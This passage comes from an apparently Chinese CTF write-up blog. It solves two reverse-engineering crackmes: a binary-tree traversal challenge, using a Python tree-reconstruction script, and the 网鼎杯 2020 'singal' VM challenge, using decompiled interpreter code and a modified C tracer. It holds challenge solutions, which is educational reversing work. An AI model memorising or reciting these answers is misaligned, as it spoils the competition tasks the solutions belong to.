class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Practice my Data Structure code.....&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Typing....Struct.....char....*left....*right............emmmmm...OK!&quot;</span>);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Traversal!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Traversal type 1:&quot;</span>);</span><br><span class="line">  type1(byte_601290);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nTraversal type 2:&quot;</span>);</span><br><span class="line">  type2(byte_601290);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nTraversal type 3:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    //type3(&amp;x[22]);   No way!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_400A37);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, <span class="string">&quot;I&#123;_&#125;Af2700ih_secTS2Et_wr&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">    x[<span class="number">24</span> * i] = v2[i];</span><br><span class="line">  qword_601298 = &amp;unk_6011E8;</span><br><span class="line">  qword_6011F0 = &amp;unk_601260;</span><br><span class="line">  qword_601268 = &amp;unk_6010F8;</span><br><span class="line">  qword_601100 = &amp;unk_601110;</span><br><span class="line">  qword_601108 = &amp;unk_601140;</span><br><span class="line">  qword_601270 = &amp;unk_601230;</span><br><span class="line">  qword_601238 = &amp;unk_601158;</span><br><span class="line">  qword_601240 = &amp;unk_601098;</span><br><span class="line">  qword_6010A0 = &amp;unk_601200;</span><br><span class="line">  qword_6010A8 = &amp;unk_601188;</span><br><span class="line">  qword_6011F8 = &amp;unk_601170;</span><br><span class="line">  qword_601178 = &amp;unk_6011B8;</span><br><span class="line">  qword_601180 = &amp;unk_6010B0;</span><br><span class="line">  qword_6010B8 = x;</span><br><span class="line">  qword_6010C0 = &amp;unk_601218;</span><br><span class="line">  qword_6012A0 = &amp;unk_601278;</span><br><span class="line">  qword_601280 = &amp;unk_6010E0;</span><br><span class="line">  qword_601288 = &amp;unk_6011A0;</span><br><span class="line">  qword_6011B0 = &amp;unk_601128;</span><br><span class="line">  qword_601130 = &amp;unk_6012A8;</span><br><span class="line">  qword_601138 = &amp;unk_6011D0;</span><br><span class="line">  qword_6011D8 = &amp;unk_601248;</span><br><span class="line">  qword_6011E0 = &amp;unk_6010C8;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看下type1和type2：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">type1</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    type1(*(a1 + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">putchar</span>(*a1);</span><br><span class="line">    type1(*(a1 + <span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">type2</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    type2(*(a1 + <span class="number">1</span>));</span><br><span class="line">    type2(*(a1 + <span class="number">2</span>));</span><br><span class="line">    <span class="built_in">putchar</span>(*a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是二叉树的遍历（具体文章看这个：<a href="https://blog.csdn.net/LX18792732127/article/details/76167482%EF%BC%89%EF%BC%8C%E4%B8%80%E5%85%B1%E6%9C%893%E7%A7%8D%EF%BC%88%E5%85%88%E5%BA%8F%E9%81%8D%E5%8E%86%EF%BC%8C%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%EF%BC%8C%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%EF%BC%89%EF%BC%8C%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%98%AF%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E5%92%8C%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E3%80%82%E5%B7%AE%E4%B8%80%E4%B8%AA%E5%85%88%E5%BA%8F%E9%81%8D%E5%8E%86%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%B8%AD%E5%BA%8F%E5%90%8E%E5%BA%8F%E6%B1%82%E5%85%88%E5%BA%8F%EF%BC%9A">https://blog.csdn.net/LX18792732127/article/details/76167482），一共有3种（先序遍历，后序遍历，中序遍历），上面的是中序遍历和后序遍历。差一个先序遍历，使用中序后序求先序：</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reConstructBinaryTree</span>(<span class="params">self, post, tin</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(post) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root = TreeNode(post[-<span class="number">1</span>])</span><br><span class="line">        TinIndex = tin.index(post[-<span class="number">1</span>])</span><br><span class="line">        root.left = self.reConstructBinaryTree(</span><br><span class="line">            post[<span class="number">0</span>:TinIndex], tin[<span class="number">0</span>:TinIndex])</span><br><span class="line">        root.right = self.reConstructBinaryTree(</span><br><span class="line">            post[TinIndex:<span class="built_in">len</span>(post) - <span class="number">1</span>], tin[TinIndex + <span class="number">1</span>:])</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PreTraversal</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        <span class="keyword">if</span> root != <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(root.val, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            self.PreTraversal(root.left)</span><br><span class="line">            self.PreTraversal(root.right)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">strm = <span class="string">&quot;2f0t02T&#123;hcsiI_SwA__r7Ee&#125;&quot;</span></span><br><span class="line">stre = <span class="string">&quot;20f0Th&#123;2tsIS_icArE&#125;e7__w&quot;</span></span><br><span class="line">post = <span class="built_in">list</span>(stre)  <span class="comment"># 后序</span></span><br><span class="line">tin = <span class="built_in">list</span>(strm)  <span class="comment"># 中序</span></span><br><span class="line"></span><br><span class="line">S = Solution()</span><br><span class="line">root = S.reConstructBinaryTree(post, tin)</span><br><span class="line">S.PreTraversal(root)</span><br></pre></td></tr></table></figure><h1 id="0x21-网鼎杯-2020-青龙组-singal（vm逆向）"><a href="#0x21-网鼎杯-2020-青龙组-singal（vm逆向）" class="headerlink" title="0x21.[网鼎杯 2020 青龙组]singal（vm逆向）"></a>0x21.[网鼎杯 2020 青龙组]singal（vm逆向）</h1><blockquote><p>  VM逆向参考：<a href="https://blog.csdn.net/weixin_43876357/article/details/108570305">https://blog.csdn.net/weixin_43876357/article/details/108570305</a></p></blockquote><p>看了wp知道这这类题目的名字：VM逆向：</p><p>主函数和关键函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a1[<span class="number">117</span>]; <span class="comment">// [esp+18h] [ebp-1D4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(a1, &amp;asc_403040, <span class="number">0x1C8</span>u);</span><br><span class="line">  vm_operad(a1, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good,The answer format is:flag &#123;&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">vm_operad</span><span class="params">(<span class="keyword">int</span> *str_local, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">100</span>]; <span class="comment">// [esp+13h] [ebp-E5h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">100</span>]; <span class="comment">// [esp+77h] [ebp-81h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">  <span class="keyword">while</span> ( v9 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( str_local[v9] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v3[v6] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = str_local[v9 + <span class="number">1</span>] + input[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = input[v8] - LOBYTE(str_local[v9 + <span class="number">1</span>]);</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = str_local[v9 + <span class="number">1</span>] ^ input[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = str_local[v9 + <span class="number">1</span>] * input[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v3[v7] != str_local[v9 + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        input[v5] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        read(input);</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v4 = input[v8] - <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = input[v8] + <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细看下operad的操作：</p><p>case7当不等的时候直接退出，v3由v4得出，v4由输入的input和本地的local_str经过运算得出。</p><p>input–&gt;v4—&gt;v3，所以我们要根据local_str算出v3，然后算v4，最后flag。</p><p>case10的时候输入的是固定长度15.</p><p>输出看下与localstr比较的是那些index，并且记录每次index的值（包括没有比较的index</p><p>所以：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">read</span><span class="params">(<span class="keyword">char</span> *Str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;string:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(Str) != <span class="number">15</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;WRONG!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">vm_operad</span><span class="params">(<span class="keyword">int</span> *str_local, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> order[<span class="number">114</span>] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">char</span> input[<span class="number">100</span>]; <span class="comment">// [esp+13h] [ebp-E5h] BYREF</span></span><br><span class="line">    <span class="keyword">char</span> v3[<span class="number">100</span>];    <span class="comment">// [esp+77h] [ebp-81h] BYREF</span></span><br><span class="line">    <span class="keyword">char</span> v4;         <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">    <span class="keyword">int</span> v5;          <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">    <span class="keyword">int</span> v6;          <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">    <span class="keyword">int</span> v7;          <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">    <span class="keyword">int</span> v8;          <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> v9;          <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="keyword">while</span> (v9 &lt; a2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (str_local[v9])</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            v3[v6] = v4;</span><br><span class="line">            ++v9;</span><br><span class="line">            ++v6;</span><br><span class="line">            ++v8;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            v4 = str_local[v9 + <span class="number">1</span>] + input[v8];</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            v4 = input[v8] - LOBYTE(str_local[v9 + <span class="number">1</span>]);</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            v4 = str_local[v9 + <span class="number">1</span>] ^ input[v8];</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            v4 = str_local[v9 + <span class="number">1</span>] * input[v8];</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            v3[v7] = str_local[v9 + <span class="number">1</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%#x,&quot;</span>, v3[v7]);</span><br><span class="line">            ++v7;</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            input[v5] = v4;</span><br><span class="line">            ++v9;</span><br><span class="line">            ++v5;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            read(input);</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            v4 = input[v8] - <span class="number">1</span>;</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            v4 = input[v8] + <span class="number">1</span>;</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        order[s++] = v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n顺序:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> ss = <span class="number">0</span>; ss &lt; <span class="built_in">strlen</span>(order); ss++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x, &quot;</span>, order[ss]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span 